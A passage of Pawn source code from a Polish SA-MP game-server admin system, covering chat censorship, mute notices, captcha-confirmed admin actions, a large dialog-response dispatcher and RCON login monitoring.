							format(string, sizeof(string),"[ADMIN-CHAT] %s: %s", getPlayerName(playerid), text[1]);
						}
			        }
			        case PREFIX_TO_ADMINS: {
			            if(strlen(text) > 1) {
			                SendReportToAdmins(playerid, text[1]);
			                return 0;
			            }
			        }
			    }
			}

			if(sended == false) {
			    new chat[150], non_censure[150], wulg_index = -1;
			    strins(chat, text, 0);
			    strins(non_censure, text, 0);

				if(getVulgCount() > 0) {
					if(checkMessageByVulg(chat, C_CENSURE, wulg_index) == _TRUE) {
						if(getSettingIntValueByIndex(s_CensureMuteStatusID) == _TRUE and IsAdmin(playerid) <= 0) {
							addPlayerCensureWarning(playerid);
							if(getPlayerCensureWarnings(playerid) != 0) {
								format(string, sizeof(string), " (Cenzura) Dostales(as) ostrzezenie za uzywanie wulgarnych slow (Slowo: '%s' | Ostrzezen: %d / %d)", getVulgByIndex(wulg_index), getPlayerCensureWarnings(playerid), getSettingIntValueByIndex(s_CensureMaxWarningsID));
								SendClientMessage(playerid, 0xFF0000FF, string);
							} else return 0;
						}
						
						if(getSettingIntValueByIndex(s_CensureStatusID) == C_TERMINATE) {
							if(getSettingIntValueByIndex(s_CensureMuteStatusID) == _FALSE) {
								format(string, sizeof(string), " (Cenzura) Na serwerze nie wolno uzywac wulgarnych slow (Slowo: '%s')", getVulgByIndex(wulg_index));
								SendClientMessage(playerid, 0xFF0000FF, string);
							}
							return 0;
						}
					}
				}

				if(wulg_index == -1) strpack(chat, non_censure);
				else strpack(chat, chat);
				strpack(non_censure, non_censure);

				if(CallRemoteFunction("ASystemChat", "dddss", playerid, getSettingIntValueByIndex(s_CensureStatusID), wulg_index == -1 ? 0 : 1, chat, non_censure) == 0) breakChat = false;
				format(string, sizeof(string), " [CHAT] %s [ID: %d]: %s", getPlayerName(playerid), playerid, text);
			}
			AddToChatLog(string);
		}
	} else return 0;
	return breakChat == true ? 0 : 1;
}

/*
	Do uzycia wewnatrz gamemoda
	forward ASystemChat(playerid, censurestatus, usedcensure, censure_msg[], noncensure_msg[]) {
	    new string[150];
		if(usedcensure == 0) {
		    strunpack(string, noncensure_msg, 128);
		    format(string, sizeof(string),"(ID: %d) %s", playerid, noncensure_msg);
		    SendPlayerMessageToAll(playerid, string);
		} else {
		    if(censurestatus == C_OFF) {
		    
		    } else {
		    
		    }
		}
	    return 0;
	}

*/

//------------------------------------------------------------------------------
public OnPlayerGetMute(playerid, time, admin_name[], reason[]) {
	new string[150];
	format(string, sizeof(string), " (Uciszenie) Gracz '"C_WHITE"%s"TEXT_DIALOG_HEAD"' zostal(a) uciszony(a) przez administratora '%s' (Czas: "C_WHITE"%d "TEXT_DIALOG_HEAD"minut).", getPlayerName(playerid), admin_name, time);
	SendClientMessageToAll(COLOR_DIALOG_HEAD, string);
	format(string, sizeof(string), "  Powod: "C_WHITE"%s", reason);
	SendClientMessageToAll(COLOR_DIALOG_HEAD, string);
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerGetUnmute(playerid, admin_name[]) {
	new string[150];
	format(string, sizeof(string), " (Uciszenie) Uciszenie dla gracza '"C_WHITE"%s"TEXT_DIALOG_BODY"' zostalo wylaczone przez administratora '%s'.", getPlayerName(playerid), admin_name);
	SendClientMessageToAll(COLOR_DIALOG_BODY, string);
	return 1;
}
//------------------------------------------------------------------------------
public OnFunctionGetError(funcname[], errormsg[]) {
	new string[256];
	format(string, sizeof(string),"(A-System) %s: %s", funcname, errormsg);
	AddToErrorLog(string);
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerNickChange(playerid, newnick[], oldnick[]) {
	new string[128];
	format(string, sizeof(string), " (Zmiana nicku) Gracz %s (ID: %d) zmienil(a) swoj nick na '%s'.", oldnick, playerid, newnick);
	SendClientMessageToAll(COLOR_DIALOG_BODY, string);
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerConfirmCaptcha(playerid, success, bool:dresponse) {
	switch(GetPlayerCaptchaBackID(playerid)) {
	    case D_CAPTCHA_HA_CYCLICOPERATIONS: {
	        if(IsAdmin(playerid) != ALVL_GAME_MASTER) return _FALSE;
	        if(success) HABaseCyclicOperations(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_CYCLICOPERATIONS);
				else HABaseCyclicOperations(playerid);
			}
	    }
	    case D_CAPTCHA_HA_DELETEBASE: {
	        if(IsAdmin(playerid) != ALVL_GAME_MASTER) return _FALSE;
	        if(success) HABaseDeleteBase(playerid, GetPlayerPage(playerid));
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_DELETEBASE);
				else HSBaseDeleteBasesList(playerid, GetPlayerPage(playerid));
			}
	    }
	    case D_CAPTCHA_HA_ACCRESET: {
	        if(IsAdmin(playerid) != ALVL_GAME_MASTER) return _FALSE;
	        if(success) HAAccountReset(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_ACCRESET);
				else HAStatisticsReset(playerid);
			}
	    }
	    case D_CAPTCHA_HA_UNBAN_STATIC: {
	        if(IsAdmin(playerid) < ALVL_HEAD_ADMIN) return _FALSE;
	        if(success) HAStaticBanUnban(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_UNBAN_STATIC);
				else HAStaticBanListResponse(playerid, GetHelpVarValue(playerid, 1));
			}
	    }
	    case D_CAPTCHA_HA_PANEL_RESET_ALOG: {
	        if(IsAdmin(playerid) < ALVL_HEAD_ADMIN) return _FALSE;
	        if(success) HSPanelAdminPasswordChange(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_PANEL_RESET_ALOG);
				else HSPanelAdminPasswordChange(playerid);
			}
	    }
	    case D_CAPTCHA_HA_PSTAT_RESET: {
	        if(IsAdmin(playerid) < ALVL_HEAD_ADMIN) return _FALSE;
	        if(success) HSPanelPlayerStatisticReset(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_PSTAT_RESET);
				else HSPanelPlayerStatisticReset(playerid);
			}
	    }
	    
	    case D_CAPTCHA_HA_ACCDELETE: {
	        if(IsAdmin(playerid) < ALVL_GAME_MASTER) return _FALSE;
	        if(success) HSPanelPlayerDeleteAccount(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_ACCDELETE);
				else HSPanelPlayerDeleteAccount(playerid);
			}
	    }
	    case D_CAPTCHA_VIP_CONFIRM: {
	        if(success) ActivateVIPPrivilages(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_VIP_CONFIRM);
				else ActivateVIPPrivilages(playerid);
			}
	    }
	    case D_CAPTCHA_PREMIUM_SEND: {
	        if(success) SendPremiumPointsConfirm(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_PREMIUM_SEND);
				else SendPremiumPointsConfirm(playerid);
			}
	    }
	    case D_CAPTCHA_HA_DAILYRESET: {
	        if(IsAdmin(playerid) != ALVL_GAME_MASTER) return _FALSE;
	        if(success) HADailyStatsReset(playerid, true);
	        else {
				if(dresponse == true) ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_DAILYRESET);
				else HAStatisticsReset(playerid);
			}
	    }
	    default: {
	        if(!success) BlockPlayer(playerid, 0, "Odmowa potwierdzenia kodu Captch'a.", -1, true);
	    }
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerLoginStatusChange(playerid, newstatus, oldstatus) {
	switch(newstatus) {
	    case LOGIN_STATUS_NOTLOGGED: PlayerLoginAtAccount(playerid, "", true);
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {
	//-------------------------------------
	if(IsValidPlayerDialogID(playerid, dialogid) == 0) return 0;
    DeleteSpecialChars(inputtext);
    DeleteSQLInjectionChars(inputtext);
    PlayerPlaySound(playerid, response ? 45400 : 4203, 0, 0, 0);
	setPlayerTabListInfo(playerid, TAB_LIST_NON);
    //-------------------------------------
	if(dialogid == DIALOG_INFO) {
        BackPlayerDialog(playerid, GetPlayerBackDialogID(playerid));
        return 1;
	}
	else if(dialogid == DIALOG_YESNO) {
	    DialogYesNoResponse(playerid, response);
	    return 1;
	}
	else if(dialogid == DIALOG_CAPTCHA_CODE) {
	    if(response) PlayerConfirmCaptcha(playerid, inputtext);
	    else OnPlayerConfirmCaptcha(playerid, 0, false);
	    return 1;
	}
	else if(dialogid == DIALOG_SEARCH_INFO) {
	    new page = GetPlayerPage(playerid) + 1;
	    if(page > 2) page = 0;
	    if(response)	ShowPlayerSearchInfo(playerid, GetHelpVarValue(playerid, 10), page);
	    else            SearchInfoBack(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_VALUE) {
	    if(response)    ShowPlayerValueDialogBack(playerid, GetPVarInt(playerid, PV_VALUE_DIALOG_BACK), inputtext);
	    else            ShowPlayerValueDialogBack(playerid, GetPVarInt(playerid, PV_VALUE_DIALOG_BACK), "", true);
	    return 1;
	}
	else if(dialogid == DIALOG_LOGIN) {
	    if(response) PlayerLoginAtAccount(playerid, inputtext);
	    else BlockPlayer(playerid, 0, "Odmowa zalogowania na konto gracza.", -1, false);
	    return 1;
	}
	else if(dialogid == DIALOG_REGISTER) {
	    if(response) PlayerRegisterAccount(playerid, inputtext);
	    else {
	        if(getSettingIntValueByIndex(s_RegisterObligatoryID) == 1) {
	            BlockPlayer(playerid, 0, "Odmowa rejestracji konta.", -1, false);
	        }
	    }
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_ACCOUNT) {
		if(response) PlayerAccountMenu(playerid, listitem);
		return 1;
	}
	else if(dialogid == DIALOG_PLAYER_NICK) {
	    if(response) PlayerAccountNickChange(playerid, inputtext);
	    else ShowPlayerAccountMenu(playerid);
	    return 1;
	}
    else if(dialogid == DIALOG_PLAYER_PASSWORD) {
	    if(response) PlayerAccountPasswordChange(playerid, inputtext);
	    else {
			if(GetPVarInt(playerid, PV_LOGIN_RESET_PASSWORD) == 0) ShowPlayerAccountMenu(playerid);
			else PlayerAccountPasswordChange(playerid, inputtext);
		}
	    return 1;
    }
    else if(dialogid == DIALOG_PLAYER_ALOG_PASSWORD) {
        if(response) PlayerAccountAlogPasswordChange(playerid, inputtext);
        else {
			if(GetPVarInt(playerid, PV_ALOG_PASSWORD_CHANGE) == 0) {
				ShowPlayerAccountMenu(playerid);
			}
		}
        return 1;
    }
    else if(dialogid == DIALOG_PLAYER_SETTINGS) {
        if(response) PlayerAccountSettings(playerid, listitem);
        else ShowPlayerAccountMenu(playerid);
        return 1;
    }
    else if(dialogid == DIALOG_ALOG) {
        if(IsAdmin(playerid) < 0 and response == 1) {
            aLogLogin(playerid, inputtext);
        }
        return 1;
    }
    else if(dialogid == DIALOG_ALOG_TYPE) {
        if(IsAdmin(playerid) < 0 and response == 1) {
            AdminLogin(playerid, listitem);
        }
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_LIST) {
        if(response)    ShowPlayerAdminList(playerid, listitem);
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_LIST_LIST) {
        if(response)    AdminListPageResponse(playerid, listitem);
        else {
                        if(GetHelpVarValue(playerid, 1) == 0) ShowPlayerAdminList(playerid);
                        else AdminListSearch(playerid);
		}
		return 1;
    }
    else if(dialogid == DIALOG_ADMIN_LIST_INFO) {
        if(response) 	ShowPlayerAdminListPage(playerid, GetHelpVarValue(playerid, 0), GetPlayerPage(playerid));
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_PANEL) {
        if(response)    ShowNormalAdminPanel(playerid, listitem);
        return 1;
    }
    else if(dialogid == DIALOG_LDL) {
        if(response)    LastDisconnectList(playerid, GetPlayerPage(playerid), listitem);
        else            ShowNormalAdminPanel(playerid);
        return 1;
    }
    else if(dialogid == DIALOG_LDL_INFO) {
        if(response)  	LastDisconnectListBanTime(playerid);
        else            LastDisconnectList(playerid, GetPlayerPage(playerid));
        return 1;
    }
    else if(dialogid == DIALOG_LDL_BAN_TIME) {
        if(response)    LastDisconnectListBanTime(playerid, inputtext);
        else {
						if(strcmp(GetStringFromLDL(GetHelpVarValue(playerid, 1)), GetHelpStringValue(playerid, 0)) == 0) {
							LastDisconnectList(playerid, GetPlayerPage(playerid), GetHelpVarValue(playerid, 0));
						} else {
						    ShowPlayerInfoDialog(playerid, BACK_LDL, "Ostatnie wyjscia", "Dane dotyczace tego slotu zostaly zmienione.");
						}
		}
        return 1;
    }
    else if(dialogid == DIALOG_LDL_BAN_REASON) {
        if(response)    LastDisconnectListBanReason(playerid, inputtext);
        else            LastDisconnectListBanTime(playerid);
        return 1;
    }
    else if(dialogid == DIALOG_LDL_BAN_CONFIRM) {
        if(response)    LastDisconnectListBanConfirm(playerid, true);
        else {
						if(strcmp(GetStringFromLDL(GetHelpVarValue(playerid, 1)), GetHelpStringValue(playerid, 0)) == 0) {
							LastDisconnectList(playerid, GetPlayerPage(playerid), GetHelpVarValue(playerid, 0));
						} else {
						    ShowPlayerInfoDialog(playerid, BACK_LDL, "Ostatnie wyjscia", "Dane dotyczace tego slotu zostaly zmienione.");
						}
        }
        return 1;
    }
  	else if(dialogid == DIALOG_TBAN_MENU) {
        if(response)    PlayerTBanMenuResponse(playerid, listitem);
        else            ShowNormalAdminPanel(playerid);
        return 1;
    }
    else if(dialogid == DIALOG_TBAN_SEARCH_MENU) {
        if(response)    PlayerTBanSearch(playerid, inputtext);
        else            PlayerTBanMenuResponse(playerid);
        return 1;
    }
    
    else if(dialogid == DIALOG_ADMIN_TBAN_LIST) {
        if(response)    TimeBanListResponse(playerid, listitem);
        else {
                        if(GetHelpVarValue(playerid, 99) == 0) {
							PlayerTBanMenuResponse(playerid);
						} else {
						    PlayerTBanSearch(playerid);
						}
		}
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_UNBAN_TIME_LIST) {
        if(response)    TimeBanListUnban(playerid);
        else {
						ShowPlayerTimeBanList(playerid, GetPlayerPage(playerid));
		}
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_UNBAN_TIME_LIST_2) {
        if(response)    TimeBanListUnban(playerid, true);
        else            ShowPlayerTimeBanList(playerid, GetPlayerPage(playerid));
        return 1;
    }
    else if(dialogid == DIALOG_ADMIN_LIST_SEARCH) {
        if(response)    AdminListSearch(playerid, inputtext);
        else {
						ShowPlayerAdminList(playerid);
						DeleteHelpStringValue(playerid, 0);
		}
        return 1;
    }
	else if(dialogid == DIALOG_HA_PANEL) {
	    if(response)    HAPanelStart(playerid, listitem);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_SETTINGS) {
	    if(response)    HAServerSettings(playerid, listitem);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HE_SET_MENU) {
	    if(response)    ShowPlayerSettingsMenu(playerid, GetPlayerPage(playerid), listitem);
	    else            HAServerSettings(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_BASE) {
	    if(response)    HABaseMenu(playerid, listitem);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_BASE_DELETE) {
	    if(response)    HSBaseDeleteBasesList(playerid, listitem);
	    else            HABaseMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_REGISTER) {
	    if(response)    HAPanelAccRegisterNick(playerid, inputtext);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_REGISTER_PASSWORD) {
	    if(response)    HAPanelAccRegisterPassword(playerid, inputtext);
	    else            HAPanelAccRegisterNick(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_DATA_MENU) {
	    if(response)    HACheckDataMenu(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 98) == 1) {
							HAPanelStart(playerid);
						}
		}
	    return 1;
	}
	else if(dialogid == DIALOG_HA_DATA_CHECK) {
	    if(response)    HACheckDataListResponse(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 99) == 0) {
							HACheckDataMenu(playerid);
						} else {
						    HACheckDataSearch(playerid);
						}
		}
	    return 1;
	}
	else if(dialogid == DIALOG_HA_DATA_CHECK_SEARCH_MENU) {
	    if(response)    HACheckDataSearch(playerid, inputtext);
	    else            HACheckDataMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_MENU) {
	    if(response)    HAPanelStaticBan(playerid, listitem);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_LIST) {
	    if(response)    HAStaticBanListResponse(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 99) == 0) {
							HAPanelStaticBan(playerid);
	  					} else {
	  					    HAPanelStaticBanSearch(playerid);
	  					}
		}
		return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_SEARCH) {
	    if(response)    HAPanelStaticBanSearch(playerid, inputtext);
	    else            HAPanelStaticBan(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_ADD_TYPE) {
	    if(response)    HAPanelStaticBanAddType(playerid, listitem);
	    else            HAPanelStaticBan(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_ADD_VALUE) {
	    if(response)    HAPanelStaticBanAddValue(playerid, inputtext);
	    else            HAPanelStaticBanAddType(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_ADD_TIME) {
	    if(response)    HAPanelStaticBanAddTime(playerid, inputtext);
	    else            HAPanelStaticBanAddValue(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_STATIC_BAN_ADD_REASON) {
	    if(response)    HAPanelStaticBanAddReason(playerid, inputtext);
	    else            HAPanelStaticBanAddTime(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_BAN_UNBAN) {
	    if(response)    HAStaticBanUnban(playerid, false);
	    else            HAStaticBanList(playerid, GetPlayerPage(playerid));
	    return 1;
	}
	else if(dialogid == DIALOG_HA_REGISTER_BASE_MENU) {
	    if(response)    HAPanelRegisterBase(playerid, listitem);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_REGISTER_BASE_LIST) {
	    if(response)    HARegisterListResponse(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 99) == 0) {
							HAPanelRegisterBase(playerid);
	  					} else {
	  					    HAPanelRegisterBaseSearch(playerid);
	  					}
		}
		return 1;
	}
	else if(dialogid == DIALOG_HA_REGISTER_BASE_SEARCH) {
	    if(response)    HAPanelRegisterBaseSearch(playerid, inputtext);
	    else            HAPanelRegisterBase(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_SEARCH) {
	    if(response)    HAPanelPlayerAccount(playerid, inputtext);
	    else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_MENU) {
	    if(response)    HAPanelPlayerAccountMenu(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 98) == 0) HAPanelPlayerAccount(playerid);
						else HAVipPlayersList(playerid);
		}
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_SEARCH_LIST) {
	    if(response)    HAPlayerAccountListResponse(playerid, listitem);
	    else            HAPanelPlayerAccount(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_NICK) {
	    if(response)    HAPanelPlayerAccountNewNick(playerid, inputtext);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_PASSWORD) {
	    if(response)    HAPanelPlayerPasswordChange(playerid, inputtext);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_ALVL) {
	    if(response)    HAPanelAdminLvLChange(playerid, listitem);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_ALVL_DATA) {
	    if(response)    HSPanelAdminLvLChangeDate(playerid, inputtext);
	    else            HAPanelAdminLvLChange(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_APWD_RESET) {
	    if(response)    ShowPlayerCaptcha(playerid, D_CAPTCHA_HA_PANEL_RESET_ALOG);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_PROV_CONFI) {
	    if(response)    HSPanelProvConfidental(playerid, inputtext);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_BAN_INFO) {
	    if(response)    HSPanelPlayerBanAccount(playerid, true);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_BAN_TIME) {
	    if(response)    HSPanelPlayerBanTime(playerid, inputtext);
	    else            HSPanelPlayerBanAccount(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_BAN_REASON) {
	    if(response)    HSPanelPlayerBanReason(playerid, inputtext);
	    else            HSPanelPlayerBanTime(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_BAN_CONFIRM) {
	    if(response)    HSPanelPlayerBanConfirm(playerid, true);
	    else            HSPanelPlayerBanReason(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_VIPMENU) {
	    if(response)    HAPanelPlayerVIPPremiumMenu(playerid, listitem);
	    else            HAPanelPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_VIPPOINTS) {
	    if(response)    HAPanelPlayerVIPPremiumPoints(playerid, inputtext);
	    else            HAPanelPlayerVIPPremiumMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_ACCOUNT_VIPTIME) {
	    if(response)    HAPanelPlayerVIPAccount(playerid, inputtext);
	    else            HAPanelPlayerVIPPremiumMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_PRIV_SETTINGS) {
	    if(response)    PlayerPrivMessagesSettings(playerid, listitem);
	    else            PlayerAccountSettings(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_PRIV_PLAYERS_SETTINGS) {
	    if(response)    PlayerPMFPSettings(playerid, listitem);
	    else            PlayerPrivMessagesSettings(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_PRIV_SOUND) {
	    if(response)    ShowPlayerPrivMessagesSounds(playerid, listitem);
	    else            PlayerPrivMessagesSettings(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_VIP_MENU) {
	    if(response)    PlayerAccountVIPSettings(playerid, listitem);
	    else            ShowPlayerAccountMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_VIP_ACTIVATE) {
	    if(response) {
	                    new vipCost;
						switch(GetHelpVarValue(playerid, 0)) {
							case 3: if((vipCost = getSettingIntValueByIndex(s_VIP3DaysCostID)) == 0) ShowPlayerInfoDialog(playerid, BACK_PLAYER_ACC_VIP_MENU, "Konto VIP - Aktywuj VIP na 3 dni", "Aktualnie system ma wylaczona opcje aktywacji konta VIP na 3 dni.");
							case 7: if((vipCost = getSettingIntValueByIndex(s_VIP7DaysCostID)) == 0) ShowPlayerInfoDialog(playerid, BACK_PLAYER_ACC_VIP_MENU, "Konto VIP - Aktywuj VIP na 7 dni", "Aktualnie system ma wylaczona opcje aktywacji konta VIP na 7 dni.");
							case 30: if((vipCost = getSettingIntValueByIndex(s_VIP30DaysCostID)) == 0) ShowPlayerInfoDialog(playerid, BACK_PLAYER_ACC_VIP_MENU, "Konto VIP - Aktywuj VIP na 30 dni", "Aktualnie system ma wylaczona opcje aktywacji konta VIP na 30 dni.");
							default: return PlayerAccountVIPSettings(playerid, -1);
						}
						if(vipCost > GetPlayerVIPPoints(playerid)) ActivateVIPPrivilages(playerid, true);
						else ShowPlayerCaptcha(playerid, D_CAPTCHA_VIP_CONFIRM);
	    } else			PlayerAccountVIPSettings(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_VIPMENU) {
		if(response)    HAVipMenu(playerid, listitem);
		else            HAPanelStart(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_VIPACCOUNTS_SEARCH) {
	    if(response)    HAPanelVipPlayersSearch(playerid, inputtext);
	    else            HAVipMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_VIPACCOUNTS_LIST) {
	    if(response)    HAVIPListResponse(playerid, listitem);
	    else {
						if(GetHelpVarValue(playerid, 99) == 0) {
							HAVipMenu(playerid);
						} else {
						    HAPanelVipPlayersSearch(playerid);
						}
		}
		return 1;
	}
	else if(dialogid == DIALOG_HA_VIPMENU_POINTS) {
	    if(response)    HAPanelVipPoints(playerid, inputtext);
	    else            HAVipMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_VIPMENU_TIME) {
	    if(response)    HAPanelVipTime(playerid, inputtext);
	    else            HAVipMenu(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_VIP_SENDPOINTS) {
	    if(response)    SendPremiumPointsValue(playerid, inputtext);
	    else            PlayerAccountVIPSettings(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_PLAYER_VIP_SENDUSER) {
	    if(response)    SendPremiumPointsPlayer(playerid, inputtext);
	    else            SendPremiumPointsValue(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_ADMIN_HELP) {
		if(response)    AdminHelpMenu(playerid, listitem);
	    return 1;
	}
	else if(dialogid == DIALOG_ADMIN_HELP_CMDS) {
	    if(response)    AdminSystemCommandsHelp(playerid, listitem);
	    else            AdminHelpMenu(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_ADMIN_ONLINE_CHECK) {
	    if(response)    ShowPlayerInfoMenu(playerid, inputtext);
	    else   			ShowNormalAdminPanel(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_HELP_MENU) {
	    if(response)    ShowPlayerHelp(playerid, listitem);
	    return 1;
	}
	else if(dialogid == DIALOG_HELP_CMD_MENU) {
	    if(response)    ShowPlayerSystemCommands(playerid, listitem);
	    else            ShowPlayerHelp(playerid, -1);
	    return 1;
	}
	else if(dialogid == DIALOG_HA_SAMPBAN_REMOVE) {
	    if(response) 	HAPanelSAMPBanRemove(playerid, inputtext);
	    else            HAPanelStaticBan(playerid);
	    return 1;
	}
	else if(dialogid == DIALOG_ADMIN_RESET_STATS) {
	    if(response)    HAStatisticsReset(playerid, listitem);
	    else            HAPanelStart(playerid);
	    return 1;
	} else if(dialogid == DIALOG_NAME_CHECK_TYPE) {
	    if(response)    ShowPlayerNameCheckMenu(playerid, listitem);
	    else {
	                    if(GetHelpVarValue(playerid, 50) == 0) {
		           			ShowNormalAdminPanel(playerid);
						}
	    }
	    return 1;
	} else if(dialogid == DIALOG_NAME_CHECK_PLAYER) {
	    if(response)    NameCheckMenuSelectPlayer(playerid, inputtext);
	    else            ShowPlayerNameCheckMenu(playerid);
	    return 1;
	}
	return 0;
}
//------------------------------------------------------------------------------
public OnPlayerClickPlayer(playerid, clickedplayerid, source) {
	switch(getPlayerTabListInfo(playerid)) {
	    case TAB_LIST_HAPANEL_PLAYER_SEARCH: {
	        HAPanelPlayerAccount(playerid, getPlayerName(clickedplayerid));
	        return 1;
	    }
	    case TAB_LIST_APANEL_PLAYER_SEARCH: {
	        ShowPlayerInfoMenu(playerid, getPlayerName(clickedplayerid));
	        return 1;
	    }
	    case TAB_LIST_NAME_CHECK_SEARCH: {
	        new str_id[4];
	        valstr(str_id, clickedplayerid);
	        NameCheckMenuSelectPlayer(playerid, str_id);
	        return 1;
	    }
	}
	return 0;
}
//------------------------------------------------------------------------------
public OnRconLoginAttempt(ip[], password[], success) {
    new p_ip[16];
    new string[128];
	if(success) {
	    forplayers(i) {
	        if(GetPlayerRconLoginStatus(i) == _FALSE) {
	            GetPlayerIp(i, p_ip, sizeof(p_ip));
	            if(strcmp(p_ip, ip) == 0) {
					if(getSettingIntValueByIndex(s_RCONAccountsID) == 0 or (GetPVarInt(i, PV_LOGIN_RCON_ADMIN) == 1 and getPlayerLoginStatus(i) == LOGIN_STATUS_LOGGED)) {
	                	SetPlayerRconLoginStatus(i, _TRUE);
	                	ResetPlayerRconFailLogin(i);
	                	format(string, sizeof(string), " (RCON) %s zalogowal(a) sie na konto RCON (IP: %s)", getPlayerName(i), ip);
	                	AddToAdminLog(string);
	                	
	                	format(string, sizeof(string), " (RCON) "C_WHITE"%s "TEXT_DIALOG_HEAD"zalogowal(a) sie na konto RCON.", getPlayerName(i));
	                	forplayers(x) {
	                	    if(IsPlayerAdmin(x)) {
								SendClientMessage(x, COLOR_DIALOG_HEAD, string);
	                	    }
	                	}
					} else {
	                	format(string, sizeof(string), " (RCON) %s zostal(a) wyrzucony za nieautoryzowane logowanie RCON (IP: %s)", getPlayerName(i), ip);
	                	AddToAdminLog(string);
					    BlockPlayer(i, 3, "Nieautoryzowane logowanie RCON", -1, true);
					}
	                break;
	            }
	        }
	    }
	} else {
	    forplayers(i) {
	        if(!IsPlayerAdmin(i) and GetPlayerRconLoginStatus(i) == _FALSE) {
	            GetPlayerIp(i, p_ip, sizeof(p_ip));
	            if(strcmp(p_ip, ip) == 0) {
                    AddPlayerRconFailLogin(i);
					if(GetPlayerRconFailLogins(i) >= getSettingIntValueByIndex(s_RCONFailLoginID)) {
	                	format(string, sizeof(string), " (RCON) %s zostal(a) wyrzucony za bledne logowanie RCON (IP: %s)", getPlayerName(i), ip);
